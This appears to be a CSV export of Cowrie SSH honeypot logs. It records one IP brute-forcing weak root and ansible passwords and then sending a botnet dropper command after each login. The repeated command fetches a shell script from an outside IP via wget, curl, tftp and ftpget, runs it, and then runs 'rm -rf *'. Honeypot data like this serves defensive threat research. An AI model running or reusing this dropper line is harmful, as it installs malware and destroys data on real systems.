eventid,timestamp,src_ip,dst_ip,session,duration,message
cowrie.session.connect,2021-02-12 10:59:29.002389+00:00,46.101.170.78,155.232.195.82,a67c53a3dbf1,,New connection: 46.101.170.78:54848 (155.232.195.82:2222) [session: a67c53a3dbf1]
cowrie.client.version,2021-02-12 10:59:29.003675+00:00,46.101.170.78,,a67c53a3dbf1,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.kex,2021-02-12 10:59:29.200427+00:00,46.101.170.78,,a67c53a3dbf1,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.login.failed,2021-02-12 10:59:30.001163+00:00,46.101.170.78,,a67c53a3dbf1,,login attempt [root/123456] failed
cowrie.session.closed,2021-02-12 10:59:31.197980+00:00,46.101.170.78,,a67c53a3dbf1,2.194388628005981,Connection lost after 2 seconds
cowrie.session.connect,2021-02-12 10:59:37.108841+00:00,46.101.170.78,155.232.195.82,85f92b53c8ea,,New connection: 46.101.170.78:33650 (155.232.195.82:2222) [session: 85f92b53c8ea]
cowrie.client.version,2021-02-12 10:59:37.110081+00:00,46.101.170.78,,85f92b53c8ea,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.kex,2021-02-12 10:59:37.305487+00:00,46.101.170.78,,85f92b53c8ea,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.login.success,2021-02-12 10:59:38.109541+00:00,46.101.170.78,,85f92b53c8ea,,login attempt [root/admin] succeeded
cowrie.session.params,2021-02-12 10:59:38.639430+00:00,46.101.170.78,,85f92b53c8ea,,[]
cowrie.command.input,2021-02-12 10:59:38.640433+00:00,46.101.170.78,,85f92b53c8ea,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.file_download,2021-02-12 10:59:39.055650+00:00,46.101.170.78,,85f92b53c8ea,,Downloaded URL (http://45.130.138.70/sh) with SHA-256 20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b to var/lib/cowrie/downloads/20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b
cowrie.session.file_download,2021-02-12 10:59:39.427723+00:00,46.101.170.78,,85f92b53c8ea,,Downloaded URL (http://45.130.138.70/sh) with SHA-256 20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b to var/lib/cowrie/downloads/20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b
cowrie.session.file_download.failed,2021-02-12 11:00:29.653981+00:00,46.101.170.78,,85f92b53c8ea,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.70/.sh) failed
cowrie.session.connect,2021-02-12 11:00:29.657483+00:00,46.101.170.78,155.232.195.82,2818b81df37e,,New connection: 46.101.170.78:40624 (155.232.195.82:2222) [session: 2818b81df37e]
cowrie.session.connect,2021-02-12 11:00:29.659248+00:00,46.101.170.78,155.232.195.82,b6163e070819,,New connection: 46.101.170.78:47760 (155.232.195.82:2222) [session: b6163e070819]
cowrie.session.connect,2021-02-12 11:00:29.663146+00:00,46.101.170.78,155.232.195.82,f3d415cd95ad,,New connection: 46.101.170.78:54866 (155.232.195.82:2222) [session: f3d415cd95ad]
cowrie.session.connect,2021-02-12 11:00:29.665013+00:00,46.101.170.78,155.232.195.82,2e371f131659,,New connection: 46.101.170.78:33608 (155.232.195.82:2222) [session: 2e371f131659]
cowrie.session.connect,2021-02-12 11:00:29.666907+00:00,46.101.170.78,155.232.195.82,808acb3a3408,,New connection: 46.101.170.78:40694 (155.232.195.82:2222) [session: 808acb3a3408]
cowrie.client.version,2021-02-12 11:00:29.668263+00:00,46.101.170.78,,2818b81df37e,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 11:00:29.669467+00:00,46.101.170.78,,b6163e070819,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 11:00:29.670523+00:00,46.101.170.78,,f3d415cd95ad,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 11:00:29.671669+00:00,46.101.170.78,,2e371f131659,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 11:00:29.672518+00:00,46.101.170.78,,808acb3a3408,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.session.connect,2021-02-12 11:00:29.706882+00:00,46.101.170.78,155.232.195.82,2c66ac8680e8,,New connection: 46.101.170.78:47706 (155.232.195.82:2222) [session: 2c66ac8680e8]
cowrie.client.version,2021-02-12 11:00:29.708190+00:00,46.101.170.78,,2c66ac8680e8,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.kex,2021-02-12 11:00:29.857323+00:00,46.101.170.78,,b6163e070819,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 11:00:29.863788+00:00,46.101.170.78,,2818b81df37e,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 11:00:29.866546+00:00,46.101.170.78,,2e371f131659,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 11:00:29.869142+00:00,46.101.170.78,,808acb3a3408,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.session.closed,2021-02-12 11:00:29.872672+00:00,46.101.170.78,,85f92b53c8ea,52.76269865036011,Connection lost after 52 seconds
cowrie.client.kex,2021-02-12 11:00:29.876801+00:00,46.101.170.78,,f3d415cd95ad,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.client.kex,2021-02-12 11:00:29.906462+00:00,46.101.170.78,,2c66ac8680e8,,SSH client hassh fingerprint: 92674389fa1e47a27ddd8d9b63ecd42b
cowrie.login.success,2021-02-12 11:00:30.628456+00:00,46.101.170.78,,b6163e070819,,login attempt [root/12345678] succeeded
cowrie.login.success,2021-02-12 11:00:30.701661+00:00,46.101.170.78,,2818b81df37e,,login attempt [root/test] succeeded
cowrie.login.success,2021-02-12 11:00:30.704698+00:00,46.101.170.78,,2e371f131659,,login attempt [root/1234567890] succeeded
cowrie.login.success,2021-02-12 11:00:30.707318+00:00,46.101.170.78,,808acb3a3408,,login attempt [ansible/ansible] succeeded
cowrie.login.success,2021-02-12 11:00:30.740884+00:00,46.101.170.78,,2c66ac8680e8,,login attempt [ansible/123456] succeeded
cowrie.login.success,2021-02-12 11:00:30.770820+00:00,46.101.170.78,,f3d415cd95ad,,login attempt [root/123456789] succeeded
cowrie.session.params,2021-02-12 11:00:31.099932+00:00,46.101.170.78,,b6163e070819,,[]
cowrie.command.input,2021-02-12 11:00:31.100828+00:00,46.101.170.78,,b6163e070819,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 11:00:31.138478+00:00,46.101.170.78,,2818b81df37e,,[]
cowrie.command.input,2021-02-12 11:00:31.139313+00:00,46.101.170.78,,2818b81df37e,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 11:00:31.250128+00:00,46.101.170.78,,2e371f131659,,[]
cowrie.command.input,2021-02-12 11:00:31.250984+00:00,46.101.170.78,,2e371f131659,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 11:00:31.410980+00:00,46.101.170.78,,808acb3a3408,,[]
cowrie.command.input,2021-02-12 11:00:31.411825+00:00,46.101.170.78,,808acb3a3408,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 11:00:31.451971+00:00,46.101.170.78,,2c66ac8680e8,,[]
cowrie.command.input,2021-02-12 11:00:31.452881+00:00,46.101.170.78,,2c66ac8680e8,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.params,2021-02-12 11:00:31.623091+00:00,46.101.170.78,,f3d415cd95ad,,[]
cowrie.command.input,2021-02-12 11:00:31.623952+00:00,46.101.170.78,,f3d415cd95ad,,CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.130.138.70/sh; curl -O http://45.130.138.70/sh; chmod 777 sh; sh sh; tftp 45.130.138.70 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 45.130.138.70; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 45.130.138.70 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *
cowrie.session.file_download,2021-02-12 11:00:31.818047+00:00,46.101.170.78,,2e371f131659,,Downloaded URL (http://45.130.138.70/sh) with SHA-256 20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b to var/lib/cowrie/downloads/20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b
cowrie.session.file_download,2021-02-12 11:00:31.825039+00:00,46.101.170.78,,808acb3a3408,,Downloaded URL (http://45.130.138.70/sh) with SHA-256 20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b to var/lib/cowrie/downloads/20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b
cowrie.session.file_download,2021-02-12 11:00:31.827131+00:00,46.101.170.78,,2818b81df37e,,Downloaded URL (http://45.130.138.70/sh) with SHA-256 20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b to var/lib/cowrie/downloads/20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b
cowrie.session.file_download,2021-02-12 11:00:31.829142+00:00,46.101.170.78,,b6163e070819,,Downloaded URL (http://45.130.138.70/sh) with SHA-256 20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b to var/lib/cowrie/downloads/20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b
cowrie.session.file_download,2021-02-12 11:00:32.018649+00:00,46.101.170.78,,2c66ac8680e8,,Downloaded URL (http://45.130.138.70/sh) with SHA-256 20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b to var/lib/cowrie/downloads/20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b
cowrie.session.file_download,2021-02-12 11:00:32.023142+00:00,46.101.170.78,,f3d415cd95ad,,Downloaded URL (http://45.130.138.70/sh) with SHA-256 20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b to var/lib/cowrie/downloads/20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b
cowrie.session.file_download,2021-02-12 11:00:32.198153+00:00,46.101.170.78,,2e371f131659,,Downloaded URL (http://45.130.138.70/sh) with SHA-256 20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b to var/lib/cowrie/downloads/20d9bc3887ad3e21a7416d1e40a86464953dfa1f44f0c0f757fc67cb3562469b
cowrie.session.file_download.failed,2021-02-12 11:01:22.437683+00:00,46.101.170.78,,2e371f131659,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.70/.sh) failed
cowrie.session.file_download.failed,2021-02-12 11:01:22.443016+00:00,46.101.170.78,,2c66ac8680e8,,Attempt to download file(s) from URL (http://45.130.138.70/sh) failed
cowrie.session.file_download.failed,2021-02-12 11:02:12.675199+00:00,46.101.170.78,,2c66ac8680e8,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.70/.sh) failed
cowrie.session.file_download.failed,2021-02-12 11:02:12.679101+00:00,46.101.170.78,,f3d415cd95ad,,Attempt to download file(s) from URL (http://45.130.138.70/sh) failed
cowrie.session.file_download.failed,2021-02-12 11:03:02.908821+00:00,46.101.170.78,,f3d415cd95ad,,Attempt to download file(s) from URL (ftp://anonymous:anonymous@45.130.138.70/.sh) failed
cowrie.session.connect,2021-02-12 11:03:02.916153+00:00,46.101.170.78,155.232.195.82,5502e0f67ab6,,New connection: 46.101.170.78:54740 (155.232.195.82:2222) [session: 5502e0f67ab6]
cowrie.session.connect,2021-02-12 11:03:02.993310+00:00,46.101.170.78,155.232.195.82,699ec31c16b1,,New connection: 46.101.170.78:33522 (155.232.195.82:2222) [session: 699ec31c16b1]
cowrie.session.connect,2021-02-12 11:03:02.994472+00:00,46.101.170.78,155.232.195.82,d05de82095ee,,New connection: 46.101.170.78:40560 (155.232.195.82:2222) [session: d05de82095ee]
cowrie.session.connect,2021-02-12 11:03:02.995597+00:00,46.101.170.78,155.232.195.82,673e50040790,,New connection: 46.101.170.78:47608 (155.232.195.82:2222) [session: 673e50040790]
cowrie.session.connect,2021-02-12 11:03:02.996722+00:00,46.101.170.78,155.232.195.82,32b9b9296860,,New connection: 46.101.170.78:54634 (155.232.195.82:2222) [session: 32b9b9296860]
cowrie.session.connect,2021-02-12 11:03:02.997843+00:00,46.101.170.78,155.232.195.82,7c4516690ed9,,New connection: 46.101.170.78:33430 (155.232.195.82:2222) [session: 7c4516690ed9]
cowrie.session.connect,2021-02-12 11:03:02.998954+00:00,46.101.170.78,155.232.195.82,ee5a71984425,,New connection: 46.101.170.78:40454 (155.232.195.82:2222) [session: ee5a71984425]
cowrie.session.connect,2021-02-12 11:03:03.000059+00:00,46.101.170.78,155.232.195.82,245d647c50d7,,New connection: 46.101.170.78:47528 (155.232.195.82:2222) [session: 245d647c50d7]
cowrie.session.connect,2021-02-12 11:03:03.001163+00:00,46.101.170.78,155.232.195.82,cce20dc708e8,,New connection: 46.101.170.78:54510 (155.232.195.82:2222) [session: cce20dc708e8]
cowrie.session.connect,2021-02-12 11:03:03.002257+00:00,46.101.170.78,155.232.195.82,50a1710da928,,New connection: 46.101.170.78:33326 (155.232.195.82:2222) [session: 50a1710da928]
cowrie.session.connect,2021-02-12 11:03:03.003348+00:00,46.101.170.78,155.232.195.82,724be802578d,,New connection: 46.101.170.78:40328 (155.232.195.82:2222) [session: 724be802578d]
cowrie.session.connect,2021-02-12 11:03:03.004443+00:00,46.101.170.78,155.232.195.82,8de64e11eff4,,New connection: 46.101.170.78:47382 (155.232.195.82:2222) [session: 8de64e11eff4]
cowrie.session.connect,2021-02-12 11:03:03.005533+00:00,46.101.170.78,155.232.195.82,c1d1903651aa,,New connection: 46.101.170.78:54390 (155.232.195.82:2222) [session: c1d1903651aa]
cowrie.session.connect,2021-02-12 11:03:03.006617+00:00,46.101.170.78,155.232.195.82,17e4251c67c1,,New connection: 46.101.170.78:33180 (155.232.195.82:2222) [session: 17e4251c67c1]
cowrie.session.connect,2021-02-12 11:03:03.007711+00:00,46.101.170.78,155.232.195.82,512d3db61679,,New connection: 46.101.170.78:40210 (155.232.195.82:2222) [session: 512d3db61679]
cowrie.session.connect,2021-02-12 11:03:03.008942+00:00,46.101.170.78,155.232.195.82,f5340c2af215,,New connection: 46.101.170.78:47230 (155.232.195.82:2222) [session: f5340c2af215]
cowrie.session.closed,2021-02-12 11:03:03.010173+00:00,46.101.170.78,,2e371f131659,153.34367394447327,Connection lost after 153 seconds
cowrie.client.version,2021-02-12 11:03:03.011022+00:00,46.101.170.78,,5502e0f67ab6,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 11:03:03.011866+00:00,46.101.170.78,,699ec31c16b1,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 11:03:03.012663+00:00,46.101.170.78,,d05de82095ee,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 11:03:03.013448+00:00,46.101.170.78,,673e50040790,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 11:03:03.014223+00:00,46.101.170.78,,32b9b9296860,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 11:03:03.015030+00:00,46.101.170.78,,7c4516690ed9,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 11:03:03.015799+00:00,46.101.170.78,,ee5a71984425,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 11:03:03.016578+00:00,46.101.170.78,,245d647c50d7,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 11:03:03.017350+00:00,46.101.170.78,,cce20dc708e8,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 11:03:03.018130+00:00,46.101.170.78,,50a1710da928,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
cowrie.client.version,2021-02-12 11:03:03.018903+00:00,46.101.170.78,,724be802578d,,Remote SSH version: b'SSH-2.0-libssh2_1.4.3'
